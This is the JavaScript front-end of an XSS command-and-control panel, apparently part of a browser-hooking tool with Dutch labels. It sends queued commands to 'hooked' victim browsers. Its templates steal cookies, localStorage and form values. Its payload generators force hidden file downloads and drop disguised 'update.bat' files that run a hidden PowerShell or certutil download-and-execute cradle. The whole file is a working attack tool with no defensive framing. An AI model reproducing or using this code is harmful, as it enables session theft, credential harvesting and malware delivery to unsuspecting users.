(function(){
  "use strict";

  var TEMPLATES = {
    "Cookies":      "return document.cookie",
    "LocalStorage": "return JSON.stringify(localStorage)",
    "DOM HTML":     "return document.documentElement.outerHTML.substring(0,5000)",
    "URL":          "return window.location.href",
    "Alert test":   "alert('XSS'); return 'alert fired'",
    "Form data":    "return [...document.querySelectorAll('input')].map(function(i){return i.name+'='+i.value}).join('&')",
    "Screenshot":   "return document.title+' | '+window.location.href",
  };

  var targetSelect    = document.getElementById("c2-target");
  var cmdTextarea     = document.getElementById("c2-cmd");
  var sendBtn         = document.getElementById("c2-send");
  var quickBar        = document.getElementById("c2-quick");
  var queueBody       = document.getElementById("c2-queue-body");
  var clearBtn        = document.getElementById("c2-clear");
  var payloadSelect   = document.getElementById("c2-payload-select");
  var deliveryMethod  = document.getElementById("c2-delivery-method");
  var payloadInject   = document.getElementById("c2-payload-inject");
  var serverHost      = "";  // filled from settings

  // Load hooked clients into target selector
  function loadHooked() {
    fetch("/api/xxs/hooked").then(function(r){ return r.json(); }).then(function(data){
      // Keep the * option, remove old dynamic options
      while (targetSelect.options.length > 1) targetSelect.remove(1);
      var seen = {};
      data.forEach(function(c){
        if (!seen[c.ip]) {
          seen[c.ip] = true;
          var opt = document.createElement("option");
          opt.value = c.ip;
          opt.textContent = c.ip;
          targetSelect.appendChild(opt);
        }
      });
    }).catch(function(){});
  }

  // Load server host from settings
  function loadSettings() {
    fetch("/api/settings").then(function(r){ return r.json(); }).then(function(data){
      serverHost = data.localhost || "";
    }).catch(function(){});
  }
  loadSettings();

  // Load payloads into selector
  function loadPayloads() {
    fetch("/api/files").then(function(r){ return r.json(); }).then(function(data){
      while (payloadSelect.options.length > 1) payloadSelect.remove(1);
      (data.payloads || []).forEach(function(p){
        var opt = document.createElement("option");
        opt.value = p.url;
        opt.textContent = p.name + " (" + formatSize(p.size) + ")";
        payloadSelect.appendChild(opt);
      });
    }).catch(function(){});
  }

  function formatSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1048576) return (bytes/1024).toFixed(1) + " KB";
    return (bytes/1048576).toFixed(1) + " MB";
  }

  // Payload delivery command generators
  function payloadCommand(url, filename, method) {
    var full = serverHost + url;
    switch (method) {
      case "iframe":
        return "var f=document.createElement('iframe');f.style.display='none';" +
               "f.src='" + full + "';document.body.appendChild(f);" +
               "return 'iframe download triggered: " + filename + "'";
      case "anchor":
        return "var a=document.createElement('a');a.href='" + full + "';" +
               "a.download='" + filename + "';a.style.display='none';" +
               "document.body.appendChild(a);a.click();a.remove();" +
               "return 'anchor download triggered: " + filename + "'";
      case "window":
        return "window.open('" + full + "','_blank');" +
               "return 'window.open triggered: " + filename + "'";
      case "ps_cradle":
        return "var a=document.createElement('a');" +
               "a.href='data:application/bat;base64,'+btoa(" +
               "'powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadFile(\\'" + full + "\\',\\'" + filename + "\\');Start-Process \\'" + filename + "\\'\"'" +
               ");a.download='update.bat';a.style.display='none';" +
               "document.body.appendChild(a);a.click();a.remove();" +
               "return 'PS cradle .bat dropped: " + filename + "'";
      case "certutil":
        return "var a=document.createElement('a');" +
               "a.href='data:application/bat;base64,'+btoa(" +
               "'@echo off\\r\\ncertutil -urlcache -split -f " + full + " %TEMP%\\\\" + filename + "\\r\\nstart %TEMP%\\\\" + filename + "'" +
               ");a.download='update.bat';a.style.display='none';" +
               "document.body.appendChild(a);a.click();a.remove();" +
               "return 'certutil .bat dropped: " + filename + "'";
      case "xhr_blob":
        return "var x=new XMLHttpRequest();x.open('GET','" + full + "',true);" +
               "x.responseType='blob';x.onload=function(){" +
               "var a=document.createElement('a');a.href=URL.createObjectURL(x.response);" +
               "a.download='" + filename + "';document.body.appendChild(a);a.click();a.remove();};" +
               "x.send();" +
               "return 'XHR blob download triggered: " + filename + "'";
      default:
        return "return 'unknown method'";
    }
  }

  // Inject payload command into textarea
  payloadInject.addEventListener("click", function(){
    var url = payloadSelect.value;
    if (!url) return;
    var filename = url.split("/").pop();
    var method = deliveryMethod.value;
    cmdTextarea.value = payloadCommand(url, filename, method);
  });

  loadPayloads();

  // Quick command buttons
  Object.keys(TEMPLATES).forEach(function(name){
    var btn = document.createElement("button");
    btn.type = "button";
    btn.textContent = name;
    btn.addEventListener("click", function(){ cmdTextarea.value = TEMPLATES[name]; });
    quickBar.appendChild(btn);
  });

  // Send command
  sendBtn.addEventListener("click", function(){
    var opdracht = cmdTextarea.value.trim();
    if (!opdracht) return;
    fetch("/api/xxs/commands", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({host: targetSelect.value, opdracht: opdracht})
    }).then(function(r){ return r.json(); }).then(function(){
      cmdTextarea.value = "";
      loadQueue();
    }).catch(function(){});
  });

  // Load command queue
  function loadQueue() {
    fetch("/api/xxs/commands").then(function(r){ return r.json(); }).then(function(data){
      while (queueBody.firstChild) queueBody.removeChild(queueBody.firstChild);

      data.forEach(function(c){
        var tr = document.createElement("tr");
        var statusClass = c.status || "queued";

        var tdId = document.createElement("td");
        tdId.textContent = c.id;

        var tdHost = document.createElement("td");
        tdHost.textContent = c.host || "*";

        var tdCmd = document.createElement("td");
        tdCmd.className = "c2-cmd-text";
        tdCmd.title = c.opdracht || "";
        tdCmd.textContent = (c.opdracht || "").substring(0, 60);

        var tdStatus = document.createElement("td");
        var badge = document.createElement("span");
        badge.className = "c2-status-badge " + statusClass;
        badge.textContent = statusClass;
        tdStatus.appendChild(badge);

        var tdResult = document.createElement("td");
        if (c.status === "completed" && c.result) {
          var resultBtn = document.createElement("button");
          resultBtn.className = "c2-result-btn";
          resultBtn.dataset.result = c.result;
          resultBtn.textContent = "bekijk";
          tdResult.appendChild(resultBtn);
        } else {
          var muted = document.createElement("span");
          muted.style.color = "var(--muted,#64748b)";
          muted.textContent = "\u2014";
          tdResult.appendChild(muted);
        }

        var tdDel = document.createElement("td");
        var delBtn = document.createElement("button");
        delBtn.className = "c2-delete-btn";
        delBtn.dataset.id = c.id;
        delBtn.textContent = "\u2715";
        tdDel.appendChild(delBtn);

        tr.appendChild(tdId);
        tr.appendChild(tdHost);
        tr.appendChild(tdCmd);
        tr.appendChild(tdStatus);
        tr.appendChild(tdResult);
        tr.appendChild(tdDel);
        queueBody.appendChild(tr);
      });
    }).catch(function(){});
  }

  // Delegated click handlers for queue table
  queueBody.addEventListener("click", function(e){
    var target = e.target;

    // Result modal
    if (target.classList.contains("c2-result-btn")) {
      var result = target.getAttribute("data-result");
      showResultModal(result);
      return;
    }

    // Delete command
    if (target.classList.contains("c2-delete-btn")) {
      var id = target.getAttribute("data-id");
      fetch("/api/xxs/commands/" + id, {method: "DELETE"}).then(function(){
        loadQueue();
      });
    }
  });

  // Clear completed
  clearBtn.addEventListener("click", function(){
    fetch("/api/xxs/commands/clear", {method: "POST"}).then(function(){
      loadQueue();
    });
  });

  // Result modal
  function showResultModal(text) {
    var overlay = document.createElement("div");
    overlay.className = "modal-overlay c2-result-modal";

    var box = document.createElement("div");
    box.className = "modal-box";

    var head = document.createElement("div");
    head.className = "modal-head";

    var h3 = document.createElement("h3");
    h3.textContent = "Command Result";
    head.appendChild(h3);

    var closeBtn = document.createElement("button");
    closeBtn.className = "modal-close-btn";
    closeBtn.id = "c2-modal-close";
    closeBtn.textContent = "\u00d7";
    head.appendChild(closeBtn);

    var body = document.createElement("div");
    body.className = "modal-body";

    var content = document.createElement("div");
    content.className = "c2-result-content";
    content.textContent = text;
    body.appendChild(content);

    box.appendChild(head);
    box.appendChild(body);
    overlay.appendChild(box);
    document.body.appendChild(overlay);

    function close(){ overlay.remove(); }
    closeBtn.addEventListener("click", close);
    overlay.addEventListener("click", function(ev){
      if (ev.target === overlay) close();
    });
    document.addEventListener("keydown", function handler(ev){
      if (ev.key === "Escape") { close(); document.removeEventListener("keydown", handler); }
    });
  }

  // Initial load + polling
  loadHooked();
  loadQueue();
  setInterval(loadQueue, 3000);
  setInterval(loadHooked, 15000);
})();
